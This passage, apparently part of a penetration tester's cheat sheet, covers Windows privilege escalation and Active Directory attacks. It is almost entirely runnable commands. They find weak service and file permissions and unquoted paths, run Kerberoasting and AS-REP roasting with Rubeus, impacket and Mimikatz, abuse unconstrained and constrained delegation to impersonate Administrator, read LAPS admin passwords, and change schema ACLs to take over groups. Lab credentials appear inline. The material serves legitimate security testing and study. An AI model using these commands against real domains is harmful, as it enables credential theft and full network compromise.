[activator]::CreateInstance([type]::GetTypeFromCLSID("13709620-C279-11CE-A49E-444553540000")).windows()

#List processes running and services
tasklist /SVC
sc query
```
Process running as system:
```
tasklist /v /fi "username eq system"
```
Installed progams:
```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
Check permissions of the processes binaries:
```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```
Check permissions of the folders of the processes binaries:
```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```
Find unsecured config files or binary:
```
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*

icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
#### SeImpersonate and\or SeAssignPrimaryToken exploitability
Enumerate all the access tokens with PowerSploit:
```
Invoke-TokenManipulation -ShowAll | ft -Wrap -Property domain,username,tokentype,logontype,processid
```
### Find vulnerable services
Get services:
```
# MMC snaps-ins
mmc.exe
services.msc

# Powershell
Get-Service

# net
net start

# sc
sc queryex type= service
sc query state= service

# wmic
wmic service list brief
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\\windows\\temp\\service_exes.txt
```
Check  service details:
```
# General information
sc qc \\<Service Name>

# Start mode:
wmic service where caption="<Service Name>" get name, caption, state, startmode
```
Check registry permissions:
```
# accesschk
accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\<Service Name>

# powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\<Service Name> | Format-List
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

# subinacl
subinacl /keyreg KLM:\System\CurrentControlSet\Services\<Service Name> 

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
```
**FullControl** give all access
**WriteData/AddFile** Can reconfigure the service binary 
**AppenData**/**AddSubdirectory** lead to code execution

Check service permissions:
```
# accesschk
accesschk.exe -uwcqv <Service Name> /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Power Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
**SERVICE_ALL_ACCESS** give all access
**SERVICE_CHANGE_CONFIG** Can reconfigure the service binary 
**WRITE_DAC:** Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG 
**WRITE_OWNER:** Can become owner, reconfigure permissions 
**GENERIC_WRITE:** Inherits SERVICE_CHANGE_CONFIG 
**GENERIC_ALL:** Inherits SERVICE_CHANGE_CONFIG

Check if service executable can be modified:
```
accesschk.exe /accepteula -quvw "C:\\Program Files\\File Permissions Service\\filepermservice.exe"
```
Find non standard services:
```
Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'} | findstr /v /i "Microsoft" | findstr /v /i "windows" | findstr /v /i "vmware"
```
Find unquoted service path:
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
Find binaries or PATH directories with weak permissions:
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Find missing DLL with PowerUp:
```
Find-PathDLLHijack PowerUp.ps1
```
Or use Process Monitor and check for "Name Not Found".

## Printers

## Active directory
### Targeted groups
#### Backup operators
Can read all the machines registry.
Can backup the entire file system of a machine (DC included) and have full read/write rights on the backup
Can read and rights all the domain and DC GPOs with robocopy in backup mode.
#### Server operators (NA)
 Can authenticate on the DC.
#### Account operators (NA)
Can add and modify all the non admin users and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password.
```
# Add user to LAPS groups
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"

# Read LAPS password
Get-DomainComputer <computername> -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
```
#### Schema admin
These group members can change the schema of the AD. It means they can change the ACLs on the objects that will be created **IN THE FUTUR**. If we modify the ALCs on the group object, only the futur group will be affected, not the ones that are already present.

Give full rights to a user on the groups:
```
$creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=domain,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-854239470-2015502385-3018109401-52104)';} -Verbose -server dc.domain.local -Credential $creds
```
When a new group is created we can add any user to it with the user who has full rights
```
$User = Get-ADUser -Identity "CN=user1,CN=Users,DC=domain,DC=local"; $Group = Get-ADGroup -Identity "CN=new_admingroup,CN=Users,DC=domain,DC=local"; $creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Add-ADGroupMember -Identity $Group -Members $User -Server dc.domain.local -Credential $creds
```
### Bloodhound
```
# Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
    
# Using powershell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

# Python
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
# through proxychain
proxychains bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all --dns-tcp
```
Cheatsheet:
[DogWhisperer - BloodHound Cypher Cheat Sheet (v2) (github.com)](https://gist.github.com/joeminicucci/d9fb42f03186f6aaa556cc5f961f537b)
[BloodHound Cypher Cheatsheet | hausec](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
[Bloodhound Cheatsheet – Custom Queries, Neo4j, etc. | Infinite Logins](https://infinitelogins.com/2022/01/28/bloodhound-cheatsheet-custom-queries-neo4j-lookups/)

### Basic Enumeration
**Logon and sessions:**
```
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
**Domain policy:**
```
# Powerview
Get-DomainPolicy
Get-DomainPolicyData
#Will show us the policy configurations of the Domain about system access or kerberos
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
(Get-DomainPolicy).PrivilegeRights 
```
**Users:**
```
# Windows binary
net user /domain

# AD Module
Get-ADUser -Filter * -Identity <user> -Properties *
#Get a spesific "string" on a user's attribute
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description

# Powerview
Get-NetUser
Get-NetUser -SamAccountName <user> 
Get-NetUser | select cn
Get-UserProperty
#Check last password change
Get-UserProperty -Properties pwdlastset
#Get a spesific "string" on a user's attribute
Find-UserField -SearchField Description -SearchTerm "wtver"
#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>
#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>
```
**Groups:**
```
# Windows binary
net group /domain  
net group /domain <Group Name> 

# Powerview
#Get groups of a user
Get-NetGroup -UserName "myusername"
# Enum interesting group members
Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
# Get "Administrators" group users. If there are groups inside, the -Recurse option will print the users inside the others groups
Get-NetGroupMember -Identity "Administrators" -Recurse
# Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups
# Get users of localgroups in computer
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local
# Check AdminSDHolder users
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
# Get restricted groups
Get-NetGPOGroup
#Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}  
```
****Domain controllers:**
```
# Windows binary
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

# AD Module
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```
****Domain computers:**
```
# AD Module
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 

# Powerview
Get-NetComputer -FullData
Get-DomainGroup
# Enumerate Live machines 
Get-NetComputer -Ping
# Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose
# Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose
# Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth
# Confirming admin access:
Invoke-UserHunter -CheckAccess
```
**Shares:**
```
# Powerview
Find-DomainShare
Get-NetFileServer
# Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess
#Find interesting files, can use filters
Find-InterestingDomainShareFile
```
**GPOs:**
```
# Powerview 
#Get current policy
gpresult /V
# Get all policies
Get-NetGPO
# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
# Shows active Policy on specified machine
Get-NetGPO -ComputerName <Name of the PC>
# Get GPO that modify local group via Restricted Groups
Get-NetGPOGroup
# Get users that are part of a Machine's local Admin group using GPOs
Find-GPOComputerAdmin -ComputerName <ComputerName>
# Machine where an user is member of a local group using GPOs
Find-GPOLocation -Identity user1 -Verbose
# Check GPO permissions
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
# Computers with a given policy applied:
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
# Get who can create new GPOs
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType
# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```
**OUs:**
```
# Powerview
Get-NetOU -FullData 
Get-NetGPO -GPOname <The GUID of the GPO>
#Get all computers inside an OU 
Get-NetOU <OU_Name> | %{Get-NetComputer -ADSPath $_}
# Get names of OUs
Get-DomainOU -Properties Name |   sort -Property Name
# Get all computers inside an OU (Servers in this case)
Get-DomainOU "Servers"   | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name}
```
**ACLs:**
Some of the Active Directory object permissions and types that we as attackers are interested in:
* **GenericAll** - full rights to the object (add users to a group or reset user's password) 
* **GenericWrite** - update object's attributes (i.e logon script)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** \- ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self (Self-Membership)** - ability to add yourself to a group
```
# Powerview
# ACLs associated with the specified account
Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
Get-PathAcl -Path "\\\dc.mydomain.local\\sysvol"
# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
# Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
# Check if you have `ExtendedRight` on `User-Force-Change-Password` object type
Get-ObjectAcl -SamAccountName <Username> -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN\username"}
# List who have GenericAll on a specific user
Get-ObjectAcl -SamAccountName <Username> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
# For a group, first get the `distinguishedName`
Get-NetGroup "domain admins" -FullData
# Afterwhat, you can get the ACLs for a specific user
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "DOMAIN/username"}
# Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"}   | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs}   |   select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Advanced enumeration
**Domain trust:**
```
# AD Module
Get-ADTrust -Filter *
Get-ADTrust -Identity <Specific Domain>

# Powerview
# Get all domain trusts (parent, children and external)
Get-NetDomainTrust -Domain <Specific Domain>
Get-DomainTrust
Get-NetForestDomain 

# Get all Domains in Forest then list each Domain trust
Get-NetForestDomain -Verbose | Get-NetDomainTrust
Get-DomainTrustMapping 

# Map all reachable Domain trusts
Invoke-MapDomainTrusts
Invoke-MapDomainTrusts -LDAP
Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection

# Find users in the current Domain that reside in Groups across trusts
Find-ForeignUser
# Get basic forest info
Get-ForestDomain
# Get info of current forest (no external)
Get-ForestGlobalCatalog 
# Get info about the external forest (if possible)
Get-ForestGlobalCatalog -Forest external.domain
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" 
Get-NetForestDomain -Verbose | Get-NetDomainTrust |?{$_.TrustType -eq 'External'}
# Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
Get-NetForestTrust
# Get users with privileges in other domains inside the forest
Get-DomainForeingUser
# Get groups with privileges in other domains inside the forest
Get-DomainForeignGroupMember
```
**Forest trust:**
```
# AD Module
Get-ADForest
Get-ADForest -Identity <ForestName>
#Domains of Forest Enumeration
(Get-ADForest).Domains

# Powerview
# Get details about current Forest
Get-NetForest
Get-NetForest -Forest <Forest>

# Get all Domains in current Forest
Get-NetForestDomain
Get-NetForestDomain -Forest <Forest>

# Get global catalogs in current Forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest <Forest>

# Map Forest trusts
Get-NetForestTrust
Get-NetForestTrust -Forest <Forest>
```
**Deleted objects:**
```
# AD Module
# You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Kerberoasting
This configuration can only happen on a domain member with the `servicePrincipalName` attribute set. 
Get User Accounts that are used as Service Accounts:
```
# Windows binary
setspn -T offense -Q */*

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

#Powershell
get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}

# Powerview
Get-NetUser -SPN
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
# Domain admins kerberostable
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  
```
Request a kerberos ticket (TGS) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local` to get it stored in the memory:
```
# AD Module
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "DOMAIN/account"
```
Extract the TGS:
```
# Powerview
Invoke-Kerberoast
Invoke-Mimikatz -Command '"kerberos::list /export"'
Request-SPNTicket -SPN "DOMAIN/username"

# impacket
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.kerberoast
Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
```
Use `tgtdeleg` to force RC4 for AES-enabled accounts:
```
# Rubeus
Rubeus.exe kerberoast /tgtdeleg
```
### AS-REP Roasting
AS-REP roasting is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected:
```
# AD Module
Get-ADUser -Filter {DoesNoteRequirePreAuth -eq $True} -Properties DoesNoteRequirePreAuth

# Powerview 
Get-DomainUser -PreauthNotRequired -Verbose
Get-NetUser -PreauthNotRequired
```
Check for interesting permissions on accounts (to disable Kerberos Preauth on an account we have Write permissions or more). Add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable:
```
# Powerview 
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
```
Disable Kerberos Preauth:
```
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
```
Extract hashes:
```
# Powerview
Get-ASREPHash -UserName <UserName> -Verbose
Invoke-ASREPRoast -Verbose

# Rubeus
Rubeus.exe asreproast /outfile:<NameOfTheFile>
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast \[/user:username\]

# impacket
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
### Unconstrained delegation
 Discover domain joined computers that have Unconstrained Delegation enabled:
 ```
# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description

# Powerview
Get-NetComputer -UnConstrained
Get-NetComputer -Unconstrainusered |   select samaccountname
```
List tickets and check if a DA or some high value target has stored its TGT:
```
# Powerview
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```
Use a compromised priviliged account to access the vulnerable service (for exemple IIS server):
```
Invoke-WebRequest http://iis01.offense.local -UseDefaultCredentials -UseBasicParsing
```
Or monitor any incoming sessions:
```
# Powerview
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay <WaitInterval> -Verbose
```
Dump the tickets to disk:
```  
# Powerview
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
Voir: [Any principal in Unconstrained Delegation]([Active Directory | HideAndSec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-which-are-in-a))
### Constrained delegation
Enumerate users and computers with constrained delegation:
```
# Powerview
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-Netuser -TrustedToAuth
Get-NetComputer -TrustedToAuth
Get-NetComputer -TrustedToAuth |   select samaccountname
# All privileged users that aren't marked as sensitive/not for delegation
Get-NetUser -AllowDelegation -AdminCount
```
If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo:
```
# kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
```
Then using the TGT we have ask a TGS for a Service this user has Access to through constrained 
delegation
```
# kekeo
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

# Rubeus
# Request a ticket for multiple services on the target, for another user (S4U)
Rubeus.exe s4u /user:user1 /rc4:<hash> /impersonateuser:Administrator /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt
# If we have a session as the user, we can just run `.\Rubeus.exe tgtdeleg /nowrap` to get the TGT in Base64, then run:
Rubeus.exe s4u /ticket:doIFCDC[SNIP]E9DQUw= /impersonateuser:Administrator /domain:domain.local /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt
# Inject the ticket
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```
Any service can be specified on the target since it is not correctly checked. All the Rubeus commands can be performed with kekeo aswell. Without protocol transition, it is not possible to use **S4U2self** to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in [Resource-Based Constrained Delegation]([Active Directory | HideAndSec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-which-are-in-a)).
 
### LAPS delegation (AllExtendedRights on a computer)
Check if LAPS is installed:
```
# Identify if installed by Program Files on Domain Controller
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'

# Identify if installed by checking the AD Object
Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'
```
Find who can get the LAPS passwords:
```
# LAPS module
Import-Module AdmPwd.PS
# Find the OUs that can read LAPS passwords
Find-AdmPwdExtendedRights -Identity <OU>
```
The following can be used to identify what objects have the ability to read the LAPS password property for a specified computer inside the domain:
```
# Powerview
Get-NetComputer -ComputerName '<Hostname>' -FullData |
    Select-Object -ExpandProperty distinguishedname |
    ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {
        Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_
    } | Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        Convert-NameToSid $_.IdentityReference
    } | Select-Object -ExpandProperty SID | Get-ADObject
```
Get ACL's where objects are allowed to read the LAPS password property.
```
# Powerview
Get-NetOU -FullData | 
    Get-ObjectAcl -ResolveGUIDs | 
    Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and 
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
        $_
    }
```
Once we have compromised a user that can read LAPS:
```
# LAPS Module
Get-AdmPwdPassword -ComputerName <Hostname>

# Powerview
Get-NetComputer | Select-Object 'name','ms-mcs-admpwd'
Get-DomainComputer -identity <Hostname> -properties ms-Mcs-AdmPwd
Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime

# PowerShell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

# Native
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
```
### GMSAPassword
```
GMSAPasswordReader.exe --accountname gmsaAccount
```
## Forets
### SID filtering
Find users with sidHistory set:
```
Get-NetUser -LDAPFilter '(sidHistory=*)'
```
To determine whether SID filtering is enabled is to open a command prompt from a domain administrator account in the trusting domain and enter:
```
# Windows binary
nltest /server:<DC in trusting domain> /domain_trusts
```
The output will display a list of trusts for the domain. If one of the Direct Outbound trusts shows <Attr: filtered>, SID filtering is active for that trust.
# Ressources
[Tib3rius/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. (github.com)](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet#lateral-movement)

[PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
[vssadmin – Penetration Testing Lab (pentestlab.blog)](https://pentestlab.blog/tag/vssadmin/)

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
[Kerberos Unconstrained Delegation - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

[Dumping Windows Credentials - Pure Security](https://pure.security/dumping-windows-credentials/)

[SessionGopher](https://github.com/Arvanaghi/SessionGopher)

[Windows Local Privilege Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation)
[PowerView/SharpView - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)
[Basic CMD for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters)
[DCSync - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces

[Active Directory | HideAndSec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-which-are-in-a)
